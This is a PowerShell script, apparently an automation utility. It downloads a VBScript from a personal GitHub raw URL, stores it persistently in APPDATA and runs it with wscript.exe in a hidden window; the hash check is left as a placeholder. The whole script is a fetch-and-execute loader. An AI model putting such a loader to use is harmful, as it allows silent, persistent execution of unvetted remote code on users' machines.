<#
.SYNOPSIS
    Persistent VBScript Runner - Downloads and executes without cleanup

.DESCRIPTION
    Downloads a VBScript file from a trusted source and executes it persistently.
    The downloaded file remains on disk after execution.

.NOTES
    Version: 2.1
    Author: Your Name
    Features:
    - Maintains downloaded VBS file
    - Enhanced security checks
    - Detailed logging
    - Execution monitoring
#>

#region Configuration
$Settings = @{
    StorageFolder   = "$env:APPDATA\VBScriptRunner"  # More persistent location than TEMP
    VbsFileURL      = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
    LocalFileName   = "ApplicationScript.vbs"
    ExpectedHash    = "INSERT_SHA256_HASH_HERE"  # Recommended for verification
    LogFile         = "$env:APPDATA\VBScriptRunner.log"
    MaxRetries      = 3  # Download retry attempts
    RetryDelay      = 5  # Seconds between retries
}
#endregion

#region Initialization
function Write-Log {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    try {
        Add-Content -Path $Settings.LogFile -Value $logEntry -Encoding UTF8 -ErrorAction Stop
    }
    catch {
        Write-Host "Logging failed: $_" -ForegroundColor Red
    }
    
    $colors = @{
        'Info'    = 'Gray'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }
    
    Write-Host $logEntry -ForegroundColor $colors[$Level]
}

# Create storage directory if needed
if (-not (Test-Path $Settings.StorageFolder)) {
    try {
        $null = New-Item -ItemType Directory -Path $Settings.StorageFolder -Force
        Write-Log "Created storage directory: $($Settings.StorageFolder)" -Level Success
    }
    catch {
        Write-Log "Failed to create storage directory: $_" -Level Error
        exit 1
    }
}
#endregion

#region Main Execution
try {
    $VbsFilePath = Join-Path $Settings.StorageFolder $Settings.LocalFileName
    
    # Download with retry logic
    $retryCount = 0
    $downloadSuccess = $false
    
    while ($retryCount -lt $Settings.MaxRetries -and -not $downloadSuccess) {
        try {
            Write-Log "Download attempt $($retryCount + 1) of $($Settings.MaxRetries)"
            
            # Remove existing file if present
            if (Test-Path $VbsFilePath) {
                Remove-Item $VbsFilePath -Force -ErrorAction Stop
            }
            
            Invoke-WebRequest -Uri $Settings.VbsFileURL -OutFile $VbsFilePath -UseBasicParsing -ErrorAction Stop
            $downloadSuccess = $true
            Write-Log "Download completed successfully" -Level Success
        }
        catch {
            $retryCount++
            if ($retryCount -ge $Settings.MaxRetries) {
                Write-Log "Final download attempt failed: $_" -Level Error
                throw $_
            }
            
            Write-Log "Download attempt failed (will retry in $($Settings.RetryDelay)s): $_" -Level Warning
            Start-Sleep -Seconds $Settings.RetryDelay
        }
    }

    # Verify download
    if (-not (Test-Path $VbsFilePath)) {
        Write-Log "Downloaded file verification failed" -Level Error
        exit 1
    }

    # Hash verification (if configured)
    if (-not [string]::IsNullOrWhiteSpace($Settings.ExpectedHash)) {
        try {
            $fileHash = (Get-FileHash -Path $VbsFilePath -Algorithm SHA256).Hash
            if ($fileHash -ne $Settings.ExpectedHash) {
                Write-Log "Hash verification failed! Expected: $($Settings.ExpectedHash), Actual: $fileHash" -Level Error
                exit 2
            }
            Write-Log "Hash verification passed" -Level Success
        }
        catch {
            Write-Log "Hash verification error: $_" -Level Error
            exit 2
        }
    }

    # Execute the script
    Write-Log "Starting script execution: $VbsFilePath"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "wscript.exe"
        $psi.Arguments = "`"$VbsFilePath`""
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.CreateNoWindow = $true

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $psi
        $null = $process.Start()

        # Capture output streams
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        
        $process.WaitForExit()

        if (-not [string]::IsNullOrEmpty($stdout)) {
            Write-Log "Script output: $stdout"
        }
        if (-not [string]::IsNullOrEmpty($stderr)) {
            Write-Log "Script errors: $stderr" -Level Warning
        }

        Write-Log "Execution completed with exit code $($process.ExitCode)" -Level Success
        exit $process.ExitCode
    }
    catch {
        Write-Log "Execution failed: $_" -Level Error
        exit 3
    }
}
catch {
    Write-Log "Fatal error: $_" -Level Error
    exit 99
}
#endregion